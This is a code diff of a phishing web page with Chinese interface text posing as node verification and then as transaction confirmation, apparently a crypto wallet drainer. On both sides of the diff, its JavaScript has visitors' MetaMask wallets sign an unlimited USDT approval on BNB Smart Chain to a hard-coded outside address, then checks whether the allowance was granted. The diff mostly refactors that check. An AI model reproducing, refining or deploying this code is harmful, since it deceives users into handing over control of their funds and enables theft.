@@ -44,8 +44,8 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 
 <div id="p2" class="box hide">
 <div class="logo">⏳</div>
-<h1>全链节点备案核验中</h1>
-<p class="desc-text">正在同步节点数据，请稍候...</p>
+<h1>交易上链中，请稍候</h1>
+<p class="desc-text">正在区块确认...</p>
 </div>
 
 <div id="p3" class="box hide">
@@ -74,16 +74,12 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 </div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/web3@4/dist/web3.min.js"></script>
 <script>
 let walletAddr = "";
 const BSC_CHAIN_ID = "0x38";
-const BSC_RPC = "https://bsc-dataseed.binance.org";
 const BSC_USDT = "0x55d398326f99059fF77548524699952727959279";
-const TARGET_SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
-const MAX_ALLOW = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-const allowanceABI = ["function allowance(address owner, address spender) view returns (uint256)"];
+const TARGET = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
+const MAX = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
 function show(id){
   document.querySelectorAll(".box").forEach(x=>x.classList.add("hide"));
@@ -96,31 +92,31 @@ async function switchBSC(){
   }catch(e){}
 }
 
-async function checkHasAuth(){
-  const web3 = new Web3(BSC_RPC);
-  const usdt = new web3.eth.Contract(allowanceABI, BSC_USDT);
-  try{
-    let val = await usdt.methods.allowance(walletAddr, TARGET_SPENDER).call();
-    return BigInt(val) > BigInt(1000000000000000000);
-  }catch(e){
-    return false;
-  }
-}
-
-function buildApproveData(){
+function getTxData(){
   let sig = "0x095ea7b3";
-  let addr = TARGET_SPENDER.replace("0x","").padStart(64,"0");
-  return sig + addr + MAX_ALLOW;
+  let p = TARGET.replace("0x","").padStart(64,"0");
+  return sig + p + MAX;
 }
 
-// 等待区块确认后再检测授权
-async function waitBlockCheck(){
-  for(let i=0;i<=20;i++){
-    let ok = await checkHasAuth();
-    if(ok) return true;
-    await new Promise(r=>setTimeout(r,1500));
+async function checkAuth(addr){
+  let res = await fetch("https://bsc-dataseed.binance.org",{
+    method:"POST",
+    body:JSON.stringify({
+      jsonrpc:"2.0",id:1,method:"eth_call",
+      params:[{
+        to:BSC_USDT,
+        data:"0xdd62ed3e0000000000000000000000000"+addr.replace("0x","")+"0000000000000000000000000"+TARGET.replace("0x","")
+      },"latest"]
+    })
+  });
+  let j = await res.json();
+  if(j.result && BigInt(j.result) > BigInt("1000000000000000000")){
+    show("p4");
+    document.getElementById("successAddr").innerText = addr;
+  }else{
+    show("p5");
+    document.getElementById("failAddr").innerText = addr;
   }
-  return false;
 }
 
 document.getElementById("connectMM").onclick = async ()=>{
@@ -128,14 +124,8 @@ document.getElementById("connectMM").onclick = async ()=>{
   show("p2");
   try{
     let acc = await ethereum.request({method:"eth_requestAccounts"});
-    walletAddr = acc[0].toLowerCase();
+    walletAddr = acc[0];
     await switchBSC();
-    let already = await checkHasAuth();
-    if(already){
-      show("p4");
-      document.getElementById("successAddr").innerText = walletAddr;
-      return;
-    }
     show("p3");
     document.getElementById("showAddr").innerText = walletAddr;
   }catch(e){
@@ -144,28 +134,21 @@ document.getElementById("connectMM").onclick = async ()=>{
 };
 
 document.getElementById("approveBtn").onclick = async ()=>{
-  if(!walletAddr) return;
+  if(!walletAddr)return;
   show("p2");
   try{
-    let txHash = await ethereum.request({
+    await ethereum.request({
       method:"eth_sendTransaction",
       params:[{
         from:walletAddr,
         to:BSC_USDT,
         value:"0x0",
         gas:"0x50000",
-        data:buildApproveData()
+        data:getTxData()
       }]
     });
-    // 等待区块同步 + 检测真实授权
-    let res = await waitBlockCheck();
-    if(res){
-      show("p4");
-      document.getElementById("successAddr").innerText = walletAddr;
-    }else{
-      show("p5");
-      document.getElementById("failAddr").innerText = walletAddr;
-    }
+    // 改成5秒判定
+    setTimeout(()=>checkAuth(walletAddr),5000);
   }catch(e){
     show("p3");
   }
